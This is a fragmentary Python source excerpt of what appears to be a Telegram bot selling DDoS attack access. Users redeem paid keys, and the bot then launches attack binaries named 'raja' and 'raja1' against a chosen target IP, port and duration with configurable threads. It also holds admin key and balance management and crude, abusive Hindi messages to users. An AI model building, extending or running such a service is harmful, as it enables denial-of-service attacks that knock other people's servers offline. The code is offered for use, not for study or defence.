...
rajaraj_04 = "QFNtb2tpZU9mZmljaWFs"
rajaraj_04e = "QEhtbV9TbW9raWU="
...
@bot.message_handler(commands=['setraja'])
def set_raja(message):
    ...
    try:
        ...
        selected_binary = "raja"
        if save_binary_state(selected_binary):
            bot.send_message(chat_id, "*Binary successfully set to raja.*", parse_mode='Markdown')
            logging.info(f"Admin {user_id} changed binary to raja")
        else:
            bot.send_message(chat_id, "*Binary set to raja but there was an error saving the state.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_raja: {e}")
        bot.send_message(chat_id, "*Error occurred while changing binary settings.*", parse_mode='Markdown')

@bot.message_handler(commands=['setraja1'])
def set_raja1(message):
    global selected_binary
    user_id = message.from_user.id
    chat_id = message.chat.id
    ...
    try:
        ...
        # Set and save new state
        selected_binary = "raja1"
        if save_binary_state(selected_binary):
            bot.send_message(chat_id, "*Binary successfully set to raja1.*", parse_mode='Markdown')
            logging.info(f"Admin {user_id} changed binary to raja1")
        else:
            bot.send_message(chat_id, "*Binary set to raja1 but there was an error saving the state.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_raja1: {e}")
        bot.send_message(chat_id, "*Error occurred while changing binary settings.*", parse_mode='Markdown')
...
def set_thread_count(message):
    ...
    if selected_binary == "raja":
        ...
        bot.send_message(chat_id, "*Thread setting is only available for raja binary. Currently using raja1.*", parse_mode='Markdown')
...
def process_thread_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, f"*Thread count set to {thread_count} for raja.*", parse_mode='Markdown')
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    ...
    try:
        ...
        if selected_binary == "raja":
            command = f"./raja {target_ip} {target_port} {duration} {thread_count} "
        else:  # raja1
            command = f"./raja1 {target_ip} {target_port} {duration}"

        # Send initial attack message
        bot.send_message(chat_id, f"🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
        ...
        if selected_binary == "raja":
            bot.send_message(chat_id, f"🚀 You can now launch your own attack and showcase your skills🚀\nUsing: raja\nThreads: {thread_count}")
        else:
            bot.send_message(chat_id, f"🚀 You can now launch your own attack and showcase your skills 🚀\nUsing: raja1")
    ...
    try:
        ...
        if save_admin_data(admin_data):
            ...
            try:
                bot.send_message(
                    int(new_admin_id),
                    "*🎉 Congratulations! LODU ADMIN BNA DIYA 🤣!*\n"
                    f"Your starting balance is: `{balance}`\n\n"
                    "bas lode etna hi use krna h:\n"
                    "/genkey - NYA KEY NIKAL LE\n"
                    "/remove - NIKAL BAHEN KE LODE KO\n"
                    "/balance - ACCOUNT DEKHLE LODE",
                    parse_mode='Markdown'
                )
            except:
...
def check_balance(message):
    ...
    if not is_admin(user_id):
        bot.reply_to(message, "*YE COMMAND SIRF TERA BAAP CHALEGA .*", parse_mode='Markdown')
        return

    balance = get_admin_balance(user_id)
    if is_super_admin(user_id):
        bot.reply_to(message, "*me to papa hu es duniya ka papa😃.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"*TERE ACCOUNT ME YHI H : {balance}*", parse_mode='Markdown')
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! To @rajaraj_04\n\n"
            f"Admin Commands:\n"
            ...
            f"/setraja - Use raja (thread) binary\n"
            f"/setraja1 - Use raja1 (no thread) binary\n"
            f"/checkbinary - Check binary status\n"
        )
    elif is_admin(user_id):
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! To @rajaraj_04\n\n"
...
def genkey_command(message):
    ...
    if not is_admin(user_id):
        bot.send_message(chat_id, "*aukat me rehle madarchod 😡 bahen chod .\nContact Owner: @rajaraj_04*", parse_mode='Markdown')
        return
...
def redeem_command(message):
    ...
    if key in keys and key not in redeemed_keys:
        ...
        bot.send_message(chat_id, "*key 🗝️ daal diya ab pelne ke liye reday 😈!*", parse_mode='Markdown')
    else:
        if key in redeemed_keys:
            bot.send_message(chat_id, "*Santosh pagal ne redeem kr liya h dusra dekh !*", parse_mode='Markdown')
        else:
...
def remove_user_command(message):
    ...
    if not is_admin(user_id):
        bot.send_message(chat_id, "*aukat me rehle madharcod 😡.\nContact Owner:- @rajaraj_04*", parse_mode='Markdown')
        return
    ...
    bot.send_message(chat_id, f"chal time khatam tera {target_user_id} lode.")
...
def list_users_command(message):
    ...
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*aukat me rehle lode.*", parse_mode='Markdown')
        return
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*redeem key kharid le bhai kab tak free lega 𝐎𝐰𝐧𝐞𝐫:- @rajaraj_04*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*TERA KEY KHATAM LODE NEW KEY KE LIYE DM KR 𝐎𝐰𝐧𝐞𝐫:- @rajaraj_04.*", parse_mode='Markdown')
        return
